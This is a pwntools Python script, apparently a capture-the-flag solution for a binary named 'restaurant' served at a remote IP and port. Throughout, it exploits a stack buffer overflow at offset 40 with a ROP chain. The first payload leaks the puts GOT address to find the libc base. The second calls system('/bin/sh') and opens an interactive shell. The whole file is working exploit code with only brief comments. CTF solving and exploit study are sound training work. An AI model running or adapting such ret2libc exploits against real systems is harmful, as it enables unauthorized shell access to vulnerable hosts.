#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './restaurant'
elf = context.binary = ELF(exe, checksec=False)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["konsole", "--hold", "-e"]
host, port = '159.65.20.166', 32514

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *fill
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    # gadgets
    pop_rdi = 0x4010a3
    ret = 0x40063e

    # first payload to leak puts addr
    io.sendlineafter(b'> ', b'1')
    offset = 40
    payload = flat({
        offset: [
            pop_rdi,
            elf.got['puts'],
            elf.plt['puts'],
            elf.symbols['fill']
        ]
    })
    io.sendlineafter(b'>', payload)
    io.recvuntil(b'jaaa')
    # recv 3 bytes then get real byte \xa3\x10@\xa0
    io.recv(3)

    # gather info
    puts_addr = unpack(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = puts_addr - libc.symbols['puts']
    log.info("Puts address: %#x", puts_addr)
    log.info("Libc base address: %#x", libc.address)

    # prepare and send 2nd payload to call system('/bin/sh')
    system = libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh'))

    payload = flat({
        offset: [
            pop_rdi,
            binsh,
            ret,
            system,
            libc.symbols['exit']
        ]
    })

    io.sendlineafter(b'> ', payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()